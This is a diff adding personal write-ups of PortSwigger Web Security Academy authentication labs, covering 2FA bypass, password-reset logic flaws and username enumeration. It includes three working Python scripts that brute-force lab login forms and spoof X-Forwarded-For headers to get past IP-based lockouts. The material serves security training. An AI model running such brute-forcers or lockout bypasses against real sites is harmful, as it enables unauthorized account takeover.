@@ -255,3 +255,249 @@ Send a POST request to "/admin-roles" to upgrade the "wiener" user account. i ad
 ![](imgs/2023-10-11-05-50-29.png)
 
 ![](imgs/2023-10-11-05-51-35.png)
+
+
+## Authentication vulnerabilities
+### Lab 01: Username enumeration via different responses
+[Link](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)
+
+This lab want me to brute force the credentials :> wtf...
+
+![](imgs/2023-10-11-06-46-47.png)
+
+![](imgs/2023-10-11-06-47-31.png)
+
+### Lab 02: 2FA simple bypass
+[Link](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass)
+
+/login -> /login2 -> /my-account
+![](imgs/2023-10-11-09-08-14.png)
+
+I login with "carlos" credentials
+![](imgs/2023-10-11-23-49-44.png)
+
+The MFA site show up. Now i change the URL to /my-account
+![](imgs/2023-10-11-23-50-10.png)
+
+![](imgs/2023-10-11-23-51-00.png)
+
+### Lab 03: Password reset broken logic
+[Link](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)
+
+I select the forgot password option at the end of the login box. The user i request is "wiener".
+![](imgs/2023-10-11-23-58-08.png)
+
+![](imgs/2023-10-11-23-58-50.png)
+
+The POST request that update the password
+![](imgs/2023-10-12-00-00-44.png)
+
+So i can change the username and password in the POST request.
+![](imgs/2023-10-12-00-01-31.png)
+
+Request to change the password of user "carlos" was sent to the server.
+
+Login with the new "carlos" credentials.
+![](imgs/2023-10-12-00-02-37.png)
+
+### Lab 04: Username enumeration via subtly different responses
+[Link](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses)
+
+Just brute force.... boring ....
+
+![](imgs/2023-10-12-00-08-08.png)
+
+```
+Username: ajax
+Password: master
+```
+
+![](imgs/2023-10-12-00-08-47.png)
+
+### Lab 05: Username enumeration via response timing
+[Link](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)
+
+The lab implements a form of IP-based brute-force protection. I can bypass the brute-force protection by specifying the "X-Forwarded-For" header in the request parameter.
+
+So i wrote a python script that brute force the credentials.
+
+```
+import requests
+import random
+import concurrent.futures
+
+
+url = 'https://0a9700eb04a0100f80db49fd00b0002a.web-security-academy.net/login'
+
+headers = {
+    'Host': '0a9700eb04a0100f80db49fd00b0002a.web-security-academy.net',
+    'Cookie': 'session=r8nIqZrC5TkYBWEWLjffIIXy42SbjmTx',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36',
+    'Referer': 'https://0a9700eb04a0100f80db49fd00b0002a.web-security-academy.net/login',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'X-Forwarded-For': 'avfbv§w§'
+}
+
+username = []
+password = []
+
+
+def send_request(username, password):
+    random_number = random.random()
+    headers = {"X-Forwarded-For": str(random_number)}
+    data = {
+        'username': username,
+        'password': password
+    }
+    
+    response = requests.post(url, headers=headers, data=data)
+    output_string = "{} {} {} {}\n".format(response.status_code, len(response.text), username, password)
+    
+    with open("output_2.txt", "a+") as file:
+        file.write(output_string)
+
+
+with concurrent.futures.ThreadPoolExecutor() as executor:
+    for i in username:
+        for j in password:
+            executor.submit(send_request, i, j)
+```
+
+Let the script do the job and i get the result:
+![](imgs/2023-10-12-14-43-10.png)
+
+### Lab 06: Broken brute-force protection, IP block
+[Link](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block)
+
+
+After 3 attempts to login, the website blocked my request for 1 minute.
+![](imgs/2023-10-12-09-38-23.png)
+
+So i can bypass the protection: Each 2 attemps failed, i send a success login request (wiener:peter).
+
+I wrote a python script that retrieve the credentials
+
+```
+import requests
+import random
+import concurrent.futures
+
+
+url = 'https://0ae5006004e9a8b7814f1bd6005b0017.web-security-academy.net/login'
+
+headers = {
+    'Host': '0ae5006004e9a8b7814f1bd6005b0017.web-security-academy.net',
+    'Cookie': 'session=r8nIqZrC5TkYBWEWLjffIIXy42SbjmTx',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36',
+    'Referer': 'https://0ae5006004e9a8b7814f1bd6005b0017.web-security-academy.net/login',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'X-Forwarded-For': 'avfbv§w§'
+}
+
+password = []
+
+def send_request(username, password):
+    random_number = random.random()
+    headers = {"X-Forwarded-For": str(random_number)}
+    data = {
+        'username': username,
+        'password': password
+    }
+    
+    response = requests.post(url, headers=headers, data=data)
+    output_string = "{} {} {} {}\n".format(response.status_code, len(response.text), username, password)
+    
+    with open("output_lab_6.txt", "a+") as file:
+        file.write(output_string)
+
+
+for i, j in enumerate(password):
+    if i % 3 == 2:
+        send_request("wiener", "peter")
+    else:
+        send_request("carlos", j)
+```
+
+![](imgs/2023-10-12-14-40-01.png)
+
+![](imgs/2023-10-12-14-38-46.png)
+
+### Lab 07: Username enumeration via account lock
+[Link](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock)
+
+![](imgs/2023-10-12-15-17-44.png)
+
+I brute force the credentials and notice that the user "archie" after several attempts, the response said that "You have made too many incorrect login attempts..."
+-> Maybe this user "archie" should be a valid user.
+
+```
+import requests
+import random
+import concurrent.futures
+
+url = 'https://0a3000ff049a85d38177a43d00cb001a.web-security-academy.net/login'
+
+headers = {
+    'Host': '0a3000ff049a85d38177a43d00cb001a.web-security-academy.net',
+    'Cookie': 'session=r8nIqZrC5TkYBWEWLjffIIXy42SbjmTx',
+    'Content-Type': 'application/x-www-form-urlencoded',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36',
+    'Referer': 'https://0a3000ff049a85d38177a43d00cb001a.web-security-academy.net/login',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9',
+    'X-Forwarded-For': 'avfbv§w§'
+}
+
+password = []
+
+
+def send_request(username, password):
+    random_number = random.random()
+    headers = {"X-Forwarded-For": str(random_number)}
+    data = {
+        'username': username,
+        'password': password
+    }
+    
+    response = requests.post(url, headers=headers, data=data)
+    output_string = "{} {} {} {}\n".format(response.status_code, len(response.text), username, password)
+    
+    with open("output_lab_7.txt", "a+") as file:
+        file.write(output_string)
+
+
+with concurrent.futures.ThreadPoolExecutor() as executor:
+    for j in password:
+        executor.submit(send_request, "archie", j)
+```
+
+Done!
+![](imgs/2023-10-12-15-29-44.png)
+![](imgs/2023-10-12-15-29-18.png)
+
+### Lab 08: 2FA broken logic
+[Link](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)
+
+
+The website requires the POST request for MFA authentication. This can lead to issue that i can bypass the login authentication by doing brute force the MFA code. 
+
+![](imgs/2023-10-12-15-48-16.png)
+
+I login with the credentials of user "wiener".  At the MFA site, i brute force the MFA code and modify "verify" header to "carlos".
+
+Before send POST request to /login2, you need to send a GET request to /login2. This GET request used to ask teh server to send an MFA mail to user "carlos" mail box.
+
+![](imgs/2023-10-12-16-19-47.png)
+
+
+![](imgs/2023-10-12-17-21-04.png)
+
+MFA: 0449
+
+![](imgs/2023-10-12-17-22-04.png)
+
+### Lab 09
